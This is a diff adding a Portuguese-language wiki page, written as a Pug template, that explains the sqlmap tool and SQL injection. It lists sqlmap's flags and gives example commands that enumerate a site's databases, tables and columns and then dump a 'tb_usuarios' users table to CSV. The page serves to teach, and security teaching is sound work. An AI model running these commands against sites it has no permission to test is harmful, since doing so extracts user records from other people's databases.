@@ -1,0 +1,68 @@
+extends ../_layouts/default
+
+block content
+
+	.subtitle
+		h1
+			a(href='/wiki') &larr; #[a(href='') Sqlmap]
+
+		sub categoria
+	
+	h4#descricao.subtitle Descrição:
+
+	.container
+		p
+		code sqlmap
+		|  é uma ferramenta que serve para detectar e explorar diversos tipos de vulnerabilidades sql na web.
+		| SQL &eacute; a linguagem de programaç&atilde;o utilizada para enviar comandos ao banco de dados. Quando a requisi&ccedil;&atilde;o ao banco de dados est&aacute; vulner&aacute;vel, &eacute; poss&iacute;vel executar diversos ataques, sendo o mais comum SQL Injection. Nesse ataque, um c&oacute;digo malicioso &eacute; passado para o interpretador ao inv&eacute;s de uma string para a consulta.
+	
+	h4#uso.subtitle Uso
+	
+	.container
+		p
+		code sqlmap -u &lt;alvo&gt; [op&ccedil;oes]
+		p
+		code -u
+		| : define o endereço do alvo
+		p
+		code --dbs
+		| : lista todos os bancos de dados dispon&iacute;veis
+		p
+		code -D
+		| : escolhe um banco de dados espec&iacute;fico
+		p
+		code --tables
+		| : lista todas as tabelas dispon&iacute;veis de um banco de dados espec&iacute;fico
+		p
+		code -T
+		| : define uma tabela espec&iacute;fica dentro do banco de dados
+		p
+		code --columns
+		| : lista todas as colunas dispon&iacute;veis de uma tabela espec&iacute;fica
+		p
+		code -C
+		| : define uma coluna espec&iacute;fica dentro da tabela
+		p
+		code --dump
+		| : lista as informa&ccedil;&otilde;es armazenadas numa tabela espec&iacute;fica do banco de dados e cria um csv com as informa&ccedil;&otilde;es
+		
+	h4#exemplos.subtitle Exemplos
+	
+	.container
+		p
+		| Analisar o site &quot;intheshell.page&quot; para encontrar os seus bancos de dados dispon&iacute;veis. Se houver um output, significa que o site est&aacute; vulner&aacute;vel para sql.
+		p
+		code sqlmap -u intheshell.page --dbs
+		p Ap&oacute;s encontrar o banco de dados &quot;bd_eits&quot; dispon&iacute;vel, listar as suas tabelas
+		p
+		code sqlmap -u intheshell.page -D bd_eits --tables
+		p Ap&oacute;s encontrar a tabela &quot;tb_usuarios&quot;, listar as colunas
+		p
+		code sqlmap -u intheshell.page -D bd_eits -T tb_usuarios --columns
+		p Listar todas as linhas do banco de dado e guardar num arquivo csv
+		p
+		code sqlmap -u intheshell.page -D bd_eits -T tb_usuarios --dump
+		p
+		| Listar apenas a coluna &quot;nome&quot; das linhas do banco de dados e guardar num arquivo csv
+		p
+		code sqlmap -u intheshell.page -D bd_eits -T tb_usuarios -C nome --dump
